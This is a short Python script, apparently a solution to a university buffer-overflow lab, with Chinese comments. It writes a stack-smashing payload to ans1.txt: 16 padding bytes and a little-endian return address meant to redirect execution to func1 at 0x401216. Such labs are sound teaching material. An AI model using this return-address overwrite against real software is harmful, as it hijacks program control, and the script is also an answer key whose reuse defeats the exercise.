import struct

# 问题1：返回到函数 func1 (0x401216)
# 填充16字节覆盖至返回地址（从 [rbp-0x8]）
padding = b'A' * 16
ret = struct.pack('<Q', 0x401216)
payload = padding + ret
with open('ans1.txt', 'wb') as f:
    f.write(payload)
print('Payload written to ans1.txt (Problem 1)')